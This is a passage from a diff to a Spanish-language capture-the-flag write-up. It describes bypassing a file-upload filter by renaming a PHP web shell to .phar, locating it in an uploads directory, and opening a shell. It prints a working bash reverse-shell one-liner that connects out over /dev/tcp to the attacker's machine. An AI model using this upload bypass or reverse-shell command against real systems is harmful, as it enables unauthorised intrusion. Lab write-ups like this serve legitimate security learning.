@@ -142,7 +142,9 @@ cambiamos la extensión del archivo shell.png a shell.phar y modificamos el `con
 
 ok. parece que ha aceptado el archivo. ahora solo debemos buscar el directorio donde se esta guardando. para ello haremos fuzzing
 ![[Pasted image 20240412232205.png]]
-los archivos que subimos se guardan en un directorio llamado uploads. asi que apuntaremos a ese archivo en la url `10.10.11.241:8080/uploads/shell`
+los archivos que subimos se guardan en un directorio llamado uploads. asi que apuntaremos a ese archivo en la url `10.10.11.241:8080/uploads/shell.phar`
 
 de esta manera obtenemos una shell que nos permite interactuar de manera mas facil con el sistema. y aprovechando esto usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"` para obtener una reverse shell mas estable
 ![[Pasted image 20240412232653.png]]
+
+### Reverse sehell
